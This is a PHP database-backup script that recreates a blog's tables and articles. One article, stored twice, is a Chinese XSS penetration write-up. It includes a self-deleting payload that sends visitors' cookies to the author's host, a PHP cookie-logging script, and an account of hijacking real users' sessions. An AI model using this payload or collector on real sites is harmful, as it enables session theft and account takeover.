<?php
/* ------------------------------------------------------ *\
   ------------------------------------------------------
   PHP Simple Library XCore 1.0.5-dev Database Backup File
        Create On: 2016-11-10 13:11:54
        SQL Server version: 10.1.10-MariaDB
        Host: localhost   
        Database: hello_world
        Tables: 12
   ------------------------------------------------------
\* ------------------------------------------------------ */

try {
/** Open Transaction Avoid Error **/
Query::beginTransaction();
 (new Query('DROP TABLE IF EXISTS #{article_tag}'))->exec();

 (new Query('CREATE TABLE `#{article_tag}` (
  `tid` bigint(20) NOT NULL,
  `aid` bigint(20) NOT NULL,
  KEY `tid` (`tid`),
  KEY `aid` (`aid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{article_tag}` VALUES (\'17\',\'69\'),(\'18\',\'70\'),(\'18\',\'61\'),(\'18\',\'71\'),(\'19\',\'72\'),(\'20\',\'73\'),(\'18\',\'74\'),(\'21\',\'74\'),(\'18\',\'76\'),(\'18\',\'77\'),(\'22\',\'77\'),(\'23\',\'77\'),(\'24\',\'77\'),(\'25\',\'77\'),(\'26\',\'77\'),(\'39\',\'79\'),(\'17\',\'62\'),(\'42\',\'80\'),(\'43\',\'80\'),(\'44\',\'80\'),(\'42\',\'82\'),(\'43\',\'82\'),(\'44\',\'82\'),(\'42\',\'86\'),(\'43\',\'86\'),(\'44\',\'86\'),(\'45\',\'87\'),(\'46\',\'87\'),(\'46\',\'104\'),(\'46\',\'105\'),(\'49\',\'110\'),(\'49\',\'111\'),(\'49\',\'113\'),(\'49\',\'114\'),(\'49\',\'115\'),(\'49\',\'116\'),(\'49\',\'118\'),(\'49\',\'120\'),(\'50\',\'121\'),(\'51\',\'122\'),(\'50\',\'123\'),(\'52\',\'124\'),(\'50\',\'125\'),(\'52\',\'66\'),(\'50\',\'67\'),(\'46\',\'126\'),(\'49\',\'127\')'))->exec();

 (new Query('DROP TABLE IF EXISTS #{articles}'))->exec();

 (new Query('CREATE TABLE `#{articles}` (
  `aid` bigint(20) NOT NULL AUTO_INCREMENT COMMENT \'ID\',
  `topic` bigint(20) NOT NULL DEFAULT \'0\' COMMENT \'话题\',
  `category` bigint(20) NOT NULL,
  `title` tinytext NOT NULL,
  `remark` tinytext NOT NULL COMMENT \'摘要\',
  `contents` text NOT NULL,
  `author` bigint(20) NOT NULL,
  `views` int(11) NOT NULL DEFAULT \'0\',
  `created` int(11) NOT NULL,
  `modified` int(11) NOT NULL,
  `keep_top` tinyint(1) NOT NULL DEFAULT \'0\' COMMENT \'置顶\',
  `replys` int(11) NOT NULL DEFAULT \'0\' COMMENT \'回复数\',
  `public` tinyint(1) NOT NULL DEFAULT \'1\',
  `allow_reply` tinyint(1) NOT NULL DEFAULT \'1\',
  `verify` tinyint(1) NOT NULL DEFAULT \'0\' COMMENT \'验证\',
  `hash` varchar(32) NOT NULL,
  PRIMARY KEY (`aid`),
  UNIQUE KEY `filemd5` (`hash`),
  KEY `topic` (`topic`),
  KEY `keep_top` (`keep_top`),
  KEY `public` (`public`),
  KEY `allow_replay` (`allow_reply`),
  KEY `verify` (`verify`),
  KEY `modified` (`modified`),
  KEY `modified_2` (`modified`),
  KEY `category` (`category`)
) ENGINE=InnoDB AUTO_INCREMENT=128 DEFAULT CHARSET=utf8'))->exec();

 (new Query('INSERT INTO  `#{articles}` VALUES (\'67\',\'0\',\'18\',\'C语言简易学习教程\',\'        
啦啦啦啦啦啦啦啦啦啦啦啦     \',\'        
![今天是1024](http://three.atd3.org/index.php/upload:315/1024.jpg)

## 前言
本系列文章，我打算写给我的学弟学妹以及可爱的小徒弟们（PS:同学们也可以来看）。

文章内容我会尽量以各种平常，无污染的超级无敌容易理解的语言来描述C语言，尽量给读者一些易懂的感觉。
本系列文章一共包含几个部分，设计程序的基本逻辑结构、程序算法、数据结构、以及一些个人的理解的东西，
希望能够在学习之余给大家一点点学习的资料。
**要好好学习哦！大学学编程，起跑线比别人晚了几个世纪了，再不努力就什么都没了**

## 目录

[编程环境安装 - Code::blocks IDE](http://three.atd3.org/index.php/article:66/)
        \',\'53\',\'5\',\'1477117704\',\'1477316327\',\'0\',\'0\',\'1\',\'1\',\'0\',\'e383f57791ff6535537ef8d7fc9fad99\'),(\'68\',\'0\',\'0\',\'Markdown-文章上传格式说明\',\'支持文章上传功能啦啦啦，本文讲了怎么使用他。\',\'# 文章上传格式解释
文章上传功能支持单文章上传（多文章批量上传怕出错），上传的格式为标准的zip压缩包，包内必须包含两个文件
一个是config.json文章属性文件（可使用C语言单行注释），一个是文章文件（可以随意，文章文件名需在config.json中
指定。
文章目录结构大致如下:
```
.
├── article.md
└── config.json
```
其中，config中格式如下
````
{
    // 选填 -- 用于更新文章
	\\\"id\\\":61,
    // 标题 - 必填
    \\\"title\\\":\\\"Markdown 文章上传格式说明\\\",
    // 作者 -必填 
    \\\"author\\\":\\\"DXkite\\\",
    // 发布时间戳
    // \\\"date\\\":1476888889,
    // 文章类别 类别1-子类别1...
    \\\"type\\\":0,
    // 标签 -必填（貌似不需要
    \\\"tags\\\":\\\"网站日志\\\",
    // 文章主体  -必填
    \\\"index\\\":\\\"article.md\\\",
    // 以下必填 （后续可能会修改
	// 内容预览 
    \\\"remark\\\":\\\"BxSite 程序目测可以直接玩了\\\",
    // 置顶
	\\\"keeptop\\\":0,
    // 允许回复
	\\\"reply\\\":1
}
```
必须保证json格式的正确性，否则压缩包无法正常解析。
[下载本页面的zip包](/index.php/upload:118/UPzipFmt.zip)
-----------------------------------------------
以上\',\'53\',\'0\',\'1477126277\',\'1477126582\',\'0\',\'0\',\'1\',\'1\',\'0\',\'15ed38fcc22a419ad2790eb820fa1b4c\'),(\'69\',\'0\',\'0\',\'BxSite - Blog DxSite\',\'BxSite -- Blog Site 内容下载预览\',\'# BxSite - Blog DxSite
[下载最新版本](https://github.com/DXkite/DxSite/releases/latest)
## 实现的功能
- 文章功能
    - 文章阅读
    - 文章列表
    - 文章标签
    - zip文章上传
- 用户功能
    - 上传头像
    - 登陆日志
	
	
## 开发中
- 博客权限
- 博客后台
- 博客安装程序

![DXkite](http://three.atd3.org/index.php/upload:113/100.png)
[github Star Me](https://github.com/DXkite/BCVOxSite)
\',\'53\',\'6\',\'1477102926\',\'1477207118\',\'0\',\'0\',\'1\',\'1\',\'0\',\'7a4aec9c6eda51d04fc5f5b953e18abf\'),(\'72\',\'0\',\'0\',\'C语言教程挖坑文章\',\'C语言教程挖坑文章，10-24日开始保持每天写点C语言文摘。\',\'#  C语言教程挖坑
\',\'53\',\'2\',\'1477126886\',\'1477126947\',\'0\',\'0\',\'1\',\'1\',\'0\',\'0a29b4da6acaa692abacccb4a6a43a0f\'),(\'73\',\'0\',\'3\',\'分类测试添加\',\'本页记录了将要开发的功能\',\'# BxSite -- Blog Site 

## 实现的功能
- 文章功能
    - 文章阅读
    - 文章列表
    - 文章标签
    - zip文章上传
- 用户功能
    - 上传头像
    - 登陆日志
	
	
## 开发中
- 博客权限
- 博客后台
- 博客安装程序

![DXkite](//three.atd3.org/index.php/upload:113/100.png)
[github Star Me](https://github.com/DXkite/BCVOxSite)\',\'53\',\'14\',\'1477138879\',\'1477138879\',\'0\',\'0\',\'1\',\'1\',\'0\',\'86cdcdab947fea9232109bd62d3ab4ec\'),(\'74\',\'0\',\'2\',\'Markdown-文章上传格式说明\',\'支持文章上传功能啦啦啦，本文讲了怎么使用他。\',\'# 文章上传格式解释
文章上传功能支持单文章上传（多文章批量上传怕出错），上传的格式为标准的zip压缩包，包内必须包含两个文件
一个是config.json文章属性文件（可使用C语言单行注释），一个是文章文件（可以随意，文章文件名需在config.json中
指定。
文章目录结构大致如下:
```
.
├── article.md
└── config.json
```
其中，config中格式如下
````
{
    // 选填 -- 用于更新文章
	\\\"id\\\":61,
    // 标题 - 必填
    \\\"title\\\":\\\"Markdown 文章上传格式说明\\\",
    // 作者 -必填 
    \\\"author\\\":\\\"DXkite\\\",
    // 发布时间戳
    // \\\"date\\\":1476888889,
    // 文章类别 类别1-子类别1...
    \\\"type\\\":0,
    // 标签 -必填（貌似不需要
    \\\"tags\\\":\\\"网站日志\\\",
    // 文章主体  -必填
    \\\"index\\\":\\\"article.md\\\",
    // 以下必填 （后续可能会修改
	// 内容预览 
    \\\"remark\\\":\\\"BxSite 程序目测可以直接玩了\\\",
    // 置顶
	\\\"keeptop\\\":0,
    // 允许回复
	\\\"reply\\\":1
}
```
必须保证json格式的正确性，否则压缩包无法正常解析。
[下载本页面的zip包](http://three.atd3.org/index.php/upload:123/UPzipFmt.zip)
-----------------------------------------------
以上\',\'53\',\'2\',\'1477195433\',\'1477196833\',\'0\',\'0\',\'1\',\'1\',\'0\',\'2b487040135f58e8dc07d004dd99ce18\'),(\'75\',\'0\',\'0\',\'Markdown-文章上传格式说明\',\'支持文章上传功能啦啦啦，本文讲了怎么使用他。\',\'# 文章上传格式解释
文章上传功能支持单文章上传（多文章批量上传怕出错），上传的格式为标准的zip压缩包，包内必须包含两个文件
一个是config.json文章属性文件（可使用C语言单行注释），一个是文章文件（可以随意，文章文件名需在config.json中
指定。
文章目录结构大致如下:
```
.
├── article.md
└── config.json
```
其中，config中格式如下
````
{
    // 选填 -- 用于更新文章
	\\\"id\\\":61,
    // 标题 - 必填
    \\\"title\\\":\\\"Markdown 文章上传格式说明\\\",
    // 作者 -必填 
    \\\"author\\\":\\\"DXkite\\\",
    // 发布时间戳
    // \\\"date\\\":1476888889,
    // 文章类别 类别1-子类别1...
    \\\"type\\\":0,
    // 标签 -必填（貌似不需要
    \\\"tags\\\":\\\"网站日志\\\",
    // 文章主体  -必填
    \\\"index\\\":\\\"article.md\\\",
    // 以下必填 （后续可能会修改
	// 内容预览 
    \\\"remark\\\":\\\"BxSite 程序目测可以直接玩了\\\",
    // 置顶
	\\\"keeptop\\\":0,
    // 允许回复
	\\\"reply\\\":1
}
```
必须保证json格式的正确性，否则压缩包无法正常解析。
[下载本页面的zip包](http://three.atd3.org/index.php/upload:123/UPzipFmt.zip)
-----------------------------------------------
以上\',\'53\',\'0\',\'1477196885\',\'1477196917\',\'0\',\'0\',\'1\',\'1\',\'0\',\'1a4a0474ad747f08f51c71c22d2b2160\'),(\'76\',\'0\',\'0\',\'Markdown-文章上传格式说明\',\'支持文章上传功能啦啦啦，本文讲了怎么使用他。\',\'# 文章上传格式解释
文章上传功能支持单文章上传（多文章批量上传怕出错），上传的格式为标准的zip压缩包，包内必须包含两个文件
一个是config.json文章属性文件（可使用C语言单行注释），一个是文章文件（可以随意，文章文件名需在config.json中
指定。
文章目录结构大致如下:
```
.
├── article.md
└── config.json
```
其中，config中格式如下
````
{
    // 选填 -- 用于更新文章
	\\\"id\\\":61,
    // 标题 - 必填
    \\\"title\\\":\\\"Markdown 文章上传格式说明\\\",
    // 作者 -必填 
    \\\"author\\\":\\\"DXkite\\\",
    // 发布时间戳
    // \\\"date\\\":1476888889,
    // 文章类别 类别1-子类别1...
    \\\"type\\\":0,
    // 标签 -必填（貌似不需要
    \\\"tags\\\":\\\"网站日志\\\",
    // 文章主体  -必填
    \\\"index\\\":\\\"article.md\\\",
    // 以下必填 （后续可能会修改
	// 内容预览 
    \\\"remark\\\":\\\"BxSite 程序目测可以直接玩了\\\",
    // 置顶
	\\\"keeptop\\\":0,
    // 允许回复
	\\\"reply\\\":1
}
```
必须保证json格式的正确性，否则压缩包无法正常解析。
[下载本页面的zip包](http://three.atd3.org/index.php/upload:123/UPzipFmt.zip)



-----------------------------------------------
以上\',\'53\',\'6\',\'1477196985\',\'1477197012\',\'0\',\'0\',\'1\',\'1\',\'0\',\'6b24797b2fbd64dcd40c8fb8ac58c9ff\'),(\'77\',\'0\',\'2\',\'Markdown-文章上传格式说明\',\'支持文章上传功能啦啦啦，本文讲了怎么使用他。\',\'# 文章上传格式解释
文章上传功能支持单文章上传（多文章批量上传怕出错），上传的格式为标准的zip压缩包，包内必须包含两个文件
一个是config.json文章属性文件（可使用C语言单行注释），一个是文章文件（可以随意，文章文件名需在config.json中
指定。
文章目录结构大致如下:
```
.
├── article.md
└── config.json
```
其中，config中格式如下
````
{
    // 选填 -- 用于更新文章
	\\\"id\\\":61,
    // 标题 - 必填
    \\\"title\\\":\\\"Markdown 文章上传格式说明\\\",
    // 作者 -必填 
    \\\"author\\\":\\\"DXkite\\\",
    // 发布时间戳
    // \\\"date\\\":1476888889,
    // 文章类别 类别1-子类别1...
    \\\"type\\\":0,
    // 标签 -必填（貌似不需要
    \\\"tags\\\":\\\"网站日志\\\",
    // 文章主体  -必填
    \\\"index\\\":\\\"article.md\\\",
    // 以下必填 （后续可能会修改
	// 内容预览 
    \\\"remark\\\":\\\"BxSite 程序目测可以直接玩了\\\",
    // 置顶
	\\\"keeptop\\\":0,
    // 允许回复
	\\\"reply\\\":1
}
```
必须保证json格式的正确性，否则压缩包无法正常解析。
[下载本页面的zip包](http://three.atd3.org/index.php/upload:123/UPzipFmt.zip)



-----------------------------------------------
以上\',\'53\',\'52\',\'1477197041\',\'1477197041\',\'0\',\'0\',\'1\',\'1\',\'0\',\'c400a36d30a4916828e8c1e2c42b25b5\'),(\'78\',\'0\',\'0\',\'Getting-Started\',\'How to style code in your web-pages\',\'# Getting Started

## How to style code in your web-pages

## Getting Started

You can load the Prettify script to highlight code in your web pages.

It adds styles to code snippets so that token boundaries stand out and
your readers can get the gist of your code without having to mentally
perform a left-to-right parse.

## Marking code sections

The prettyprinter looks for `<pre>`, `<code>`, or `<xmp>` elements
with the *prettyprint* class:

```HTML
<pre class=\\\"prettyprint\\\">
source code here
</pre>
```

and adds `<span>`s to colorize keywords, strings, comments, and other
token types.

If you\\\'re using Markdown or some other HTML generator that does not
add classes, you can alternatively ask the prettifier to target your
code by preceding it with a processing instruction thus:

```HTML
<?prettify?>
<pre class=\\\"prettyprint\\\">
code here
</pre>
```

[Larger example](https://rawgit.com/google/code-prettify/master/examples/quine.html)


## Auto-Loader

You can load the JavaScript and CSS for prettify via one URL

```HTML
<script src=\\\"https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js\\\"></script>
```

will load the entire system and schedule the prettifier to run on page
load.  There are a variety of additional options you can specify (as
CGI arguments) to configure the runner.

| CGI parameter | default | meaning |
| ------------- | ------- | ------- |
| autoload=(true, false) | true | run automatically on page load |
| lang=... | none | Loads the language handler for the given language which is usually the file extension for source files for that language.  See the [index of language handlers](https://github.com/google/code-prettify/tree/master/src).  If specified multiple times (`?lang=css&lang=ml`) then all are loaded. |
| skin=... | none | See the [skin gallery](https://cdn.rawgit.com/google/code-prettify/master/styles/index.html).  If specified multiple times, the first one to successfully load is used. |
| callback=js_ident | | `window.exports[\\\"js_ident\\\"]` will be called when prettyprinting finishes.  If specified multiple times, all are called. |

For example

```HTML
<script src=\\\"https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?lang=css&amp;skin=sunburst\\\"></script>
```

specifies the `lang` parameter to also load the CSS language extension
and the `skin` parameter to load the
[*sunburst*](https://cdn.rawgit.com/google/code-prettify/master/styles/index.html#sunburst) skin.

## Serving your own JS & CSS

You can
[download](https://raw.githubusercontent.com/google/code-prettify/master/distrib/prettify-small.tgz)
the scripts and styles and serve them yourself.  Make sure to include
both the script and a stylesheet:

```HTML
<link href=\\\"prettify.css\\\" type=\\\"text/css\\\" rel=\\\"stylesheet\\\" />
<script type=\\\"text/javascript\\\" src=\\\"prettify.js\\\"></script>
```

and then run the `prettyPrint` function once your page has finished
loading.  One way to do this is via the `onload` handler thus:

```HTML
<body onload=\\\"prettyPrint()\\\">
```

## Styling

The prettifier only adds `class`es; it does not specify exact colors
or fonts, so you can swap in a different stylesheet to change the way
code is prettified.

The easiest way to create your own stylesheet is by starting with one
from the
[style gallery](https://cdn.rawgit.com/google/code-prettify/master/styles/index.html)
and tweaking it.

You can use CSS `@media` rules to specify styles that work well with
printers (for example, dark text on a white background) when someone
tries to print it.

## Language Hints

Prettify makes a best effort to guess the language but works best with
C-like and HTML-like languages.  For others, there are special
language handlers that are chosen based on language hints.

```HTML
<pre class=\\\"prettyprint lang-scm\\\">(friends \\\'of \\\'(parentheses))</pre>
```

uses the `lang-scm` hint to specify that the code is Scheme code.

```HTML
<?prettify lang=scm?>
<pre>(friends \\\'of \\\'(parentheses))</pre>
```

also works.

## Line Numbering

The `linenums` class in

```HTML
<pre class=\\\"prettyprint linenums\\\">
Many
lines
of
code
</pre>
```

tells the prettyprinter to insert an `<ol>` element and `<li>`
elements around each line so that you get line numbers.

Most stylesheets then hide the line numbers except for every fifth line.

The class `linenums:40` makes line numbering start at line 40 if
you\\\'re excerpting a larger chunk of code, and

```HTML
<?prettify linenums=40?>
<pre>lots of code</pre>
```

also works.
\',\'53\',\'0\',\'1477202906\',\'1477202926\',\'0\',\'0\',\'1\',\'1\',\'0\',\'1e9989d0c4537e0accb9edac8619be67\'),(\'79\',\'0\',\'2\',\'Getting-Started\',\'How to style code in your web-pages\',\'# Getting Started

## How to style code in your web-pages

## Getting Started

You can load the Prettify script to highlight code in your web pages.

It adds styles to code snippets so that token boundaries stand out and
your readers can get the gist of your code without having to mentally
perform a left-to-right parse.

## Marking code sections

The prettyprinter looks for `<pre>`, `<code>`, or `<xmp>` elements
with the *prettyprint* class:

```HTML
<pre class=\\\"prettyprint\\\">
source code here
</pre>
```

and adds `<span>`s to colorize keywords, strings, comments, and other
token types.

If you\\\'re using Markdown or some other HTML generator that does not
add classes, you can alternatively ask the prettifier to target your
code by preceding it with a processing instruction thus:

```HTML
<?prettify?>
<pre class=\\\"prettyprint\\\">
code here
</pre>
```

[Larger example](https://rawgit.com/google/code-prettify/master/examples/quine.html)


## Auto-Loader

You can load the JavaScript and CSS for prettify via one URL

```HTML
<script src=\\\"https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js\\\"></script>
```

will load the entire system and schedule the prettifier to run on page
load.  There are a variety of additional options you can specify (as
CGI arguments) to configure the runner.

| CGI parameter | default | meaning |
| ------------- | ------- | ------- |
| autoload=(true, false) | true | run automatically on page load |
| lang=... | none | Loads the language handler for the given language which is usually the file extension for source files for that language.  See the [index of language handlers](https://github.com/google/code-prettify/tree/master/src).  If specified multiple times (`?lang=css&lang=ml`) then all are loaded. |
| skin=... | none | See the [skin gallery](https://cdn.rawgit.com/google/code-prettify/master/styles/index.html).  If specified multiple times, the first one to successfully load is used. |
| callback=js_ident | | `window.exports[\\\"js_ident\\\"]` will be called when prettyprinting finishes.  If specified multiple times, all are called. |

For example

```HTML
<script src=\\\"https://cdn.rawgit.com/google/code-prettify/master/loader/run_prettify.js?lang=css&amp;skin=sunburst\\\"></script>
```

specifies the `lang` parameter to also load the CSS language extension
and the `skin` parameter to load the
[*sunburst*](https://cdn.rawgit.com/google/code-prettify/master/styles/index.html#sunburst) skin.

## Serving your own JS & CSS

You can
[download](https://raw.githubusercontent.com/google/code-prettify/master/distrib/prettify-small.tgz)
the scripts and styles and serve them yourself.  Make sure to include
both the script and a stylesheet:

```HTML
<link href=\\\"prettify.css\\\" type=\\\"text/css\\\" rel=\\\"stylesheet\\\" />
<script type=\\\"text/javascript\\\" src=\\\"prettify.js\\\"></script>
```

and then run the `prettyPrint` function once your page has finished
loading.  One way to do this is via the `onload` handler thus:

```HTML
<body onload=\\\"prettyPrint()\\\">
```

## Styling

The prettifier only adds `class`es; it does not specify exact colors
or fonts, so you can swap in a different stylesheet to change the way
code is prettified.

The easiest way to create your own stylesheet is by starting with one
from the
[style gallery](https://cdn.rawgit.com/google/code-prettify/master/styles/index.html)
and tweaking it.

You can use CSS `@media` rules to specify styles that work well with
printers (for example, dark text on a white background) when someone
tries to print it.

## Language Hints

Prettify makes a best effort to guess the language but works best with
C-like and HTML-like languages.  For others, there are special
language handlers that are chosen based on language hints.

```HTML
<pre class=\\\"prettyprint lang-scm\\\">(friends \\\'of \\\'(parentheses))</pre>
```

uses the `lang-scm` hint to specify that the code is Scheme code.

```HTML
<?prettify lang=scm?>
<pre>(friends \\\'of \\\'(parentheses))</pre>
```

also works.

## Line Numbering

The `linenums` class in

```HTML
<pre class=\\\"prettyprint linenums\\\">
Many
lines
of
code
</pre>
```

tells the prettyprinter to insert an `<ol>` element and `<li>`
elements around each line so that you get line numbers.

Most stylesheets then hide the line numbers except for every fifth line.

The class `linenums:40` makes line numbering start at line 40 if
you\\\'re excerpting a larger chunk of code, and

```HTML
<?prettify linenums=40?>
<pre>lots of code</pre>
```

also works.
\',\'53\',\'29\',\'1477202982\',\'1477203119\',\'0\',\'0\',\'1\',\'1\',\'0\',\'526087ff5b283212cd7adfcc0a06eae5\'),(\'80\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透。\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](http://three.atd3.org/index.php/upload:131/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？ :微笑: 反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\"\\\" 
onerror=\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\"<?php \\\\$a=[];\\\\n\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\"\\\';\\\\n\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\"\\\" onerror=\\\"console.log(\\\'xss\\\');\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](http://three.atd3.org/index.php/upload:132/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](http://three.atd3.org/index.php/upload:133/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](http://three.atd3.org/index.php/upload:134/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](http://three.atd3.org/index.php/upload:135/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](http://three.atd3.org/index.php/upload:136/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](http://three.atd3.org/index.php/upload:137/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](http://three.atd3.org/index.php/upload:138/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](http://three.atd3.org/index.php/upload:139/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](http://three.atd3.org/index.php/upload:140/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](http://three.atd3.org/index.php/upload:141/a_girl.png)
哎呀呀，居然是个妹子，，咳咳，单身30年，见谅（年18.。。。。。
这次漏洞危险性已经可以得到证明了，说大不大，说小不小。嗯，，，
已经和客服联系了，毕竟是朋友（关键是妹子:P），后续的自我复制就算了了。没必要搞得整个网站都挂上我的XSS不是么。。
啊哈哈，好了，总结，，
## 3. 总结
在此次渗透过程中我使用了三种方式
1. XSS 注入
2. session fixation 探测
3. iframe 劫持  
	这个东西麽。网站对其有防范。。。就不截图了

在自己设置网站的过程中，应该注意的就是一些细节问题。咳，脑残的对百度进行了session fixation试探，删除一个cookie
直接变成了未登陆状态，咳，还意外发现了这个：
![百度的招聘](http://three.atd3.org/index.php/upload:142/chance_for_you.png)
所以说，机会只留给那些有啥啥啥的人。别再感叹无法求职，或许你按一个`F12`键，求职单就来了
>本文章写作的目的不是教你如何去进行恶意的破坏活动，而是为了教你如何抵御这些攻击行为\',\'53\',\'3\',\'1476889999\',\'1476889999\',\'0\',\'0\',\'1\',\'1\',\'0\',\'9611765fe5a02bff8b22a042d4b12128\'),(\'82\',\'0\',\'0\',\'一次不完整的XSS混合渗透测试记录\',\'第一次实地操作web渗透。\',\'# 一次不完整的XSS混合渗透测试记录
第一次实地操作web渗透，啊哈哈，结果还是喜人的，附上Cookie登陆后的图：
![Cookie 登陆](http://three.atd3.org/index.php/upload:146/login_by_cookie.png)
常规信息已经打码，本次web渗透的成功原因有两个
## 1. XSS注入漏洞若干  
为啥这么说勒？若干？ :微笑: 反正不是第一次在这个网站上发现XSS漏洞了，想我当初把XSS
当作一个玩具，咳咳，，注入CSS样式表，发奇怪的帖子，就是自定义样式的帖子，嗯，后续
和网站的客服妹子联系后修补了。看了《XSS跨站脚本攻击剖析与防御》后，才知道这个漏洞叫
XSS注入漏洞，手痒痒，就再次对这个网站进行了测试，不测试不知道,已测试，我尼玛，，
先贴测试脚本
```html
<img src=\\\"\\\" 
onerror=\\\"var s=document.createElement(\\\'script\\\');
s.setAttribute(\\\'src\\\',\\\'//safe.atd3.cn/a?b=\\\'+document.domain+\\\'&c=\\\'+document.cookie);
var b=document.all[0];
b.appendChild(s);
b.removeChild(s);
this.parentNode.removeChild(this);\\\">
```
这是一个中规中矩的测试脚本，在网页中插入图片，由于图片没有指定的url
然后会调用`onerror`事件，在`onerror`事件中会创建一个脚本链接，发出跨站请求，请求的查询字符为网页的`cookie`和域名
反正这是我的一个简易后台代码,PHP做服务器端的
```php
<?php
$file_name=\\\'cookie.php\\\';
if (!file_exists($file_name))
	file_put_contents($file_name,\\\"<?php \\\\$a=[];\\\\n\\\");
if (isset($_SERVER[\\\'QUERY_STRING\\\']))
{
	file_put_contents($file_name,\\\'$a[]=\\\\\\\'\\\'.$_SERVER[\\\'QUERY_STRING\\\'].\\\"\\\';\\\\n\\\",FILE_APPEND);
}
```
好了，前期准备做好了，接下来开始注入测试，，，进入网站，，
直接插入一个简单的代码
```html
<img src=\\\"\\\" onerror=\\\"console.log(\\\'xss\\\');\\\">
```
这个是用来测试XSS漏洞的，，由于篇幅原因，我直接拿最致命的XSS注入载体---markdown编辑器来做示范吧,如图
![用Markdown编辑](http://three.atd3.org/index.php/upload:147/edit_with_markdown.png)
咳咳，，嗯，我顺带回答了问题，看看注入后的效果
![注入脚本查看](http://three.atd3.org/index.php/upload:148/nothing.png)
啥都木有，是不是插入失败了？不。脚本自我删除了，唯一的痕迹就在这里
![唯一的痕迹](http://three.atd3.org/index.php/upload:149/my_script.png)
然后，，我们去服务器看看，，由于时原因，我就没等这个小伙子再次访问这个页面了，拿个其他小伙子的截图凑合一下，，额，四次捕获同一个小伙子
![倒霉的小伙子](http://three.atd3.org/index.php/upload:150/cookies.png)
侬，这是XSS注入的后果，成功拿到了cookie，可是高兴的太早了，，如果这样就可以过了，那标题就不是混合了，，，
接下来是第二个成功原因`session fixation`漏洞
## 2. session fixation 攻击
第一次XSS攻击成功获取到了cookie，，哎，还是说说这个玩意吧，，
毕竟网站的开发者考虑到了XSS注入，却没关注到这点，开发者做过XSS防范，如图
![XSS防范](http://three.atd3.org/index.php/upload:151/xss_def.png)
看图`HTTP`的红色标记，，这个是标记了`HttpOnly`的cookie，通过这个，我们用脚本
`document.cookie`获取的cookie就不完整了，，，如图，，
![脚本获取的cookie](http://three.atd3.org/index.php/upload:152/cookie_with_js.png)
可怕。我一直在想怎么绕过这个，，可惜哦。不可以。。
还有要吐槽的是那个箭头标注的cookie名，反正我盗取的cookie都一个样，，亏我还以为他是随机生成的，哎
cookie不完整，，经过测试，，我发现特么只需要一个cookie就好了，，
![修改cookie](http://three.atd3.org/index.php/upload:153/one_cookie.png)
通过抓包软件，抓到的数据包可以证明：
![一个cookie的GET](http://three.atd3.org/index.php/upload:154/one_cookie_get.png)
然后还有更无语的,那个我特么则怎么都获取不到的`HttpOnly`的cookie直接出现在了返回的包里，也是没得讲了
![返回设置cookie](http://three.atd3.org/index.php/upload:155/set_cookie.png)
就问傻不傻~！session fixation攻击，，？应该就是叫这个来着
咳咳咳。。。嗯，获取到的返回页面，再截图一个，，，
![返回的页面](http://three.atd3.org/index.php/upload:156/a_girl.png)
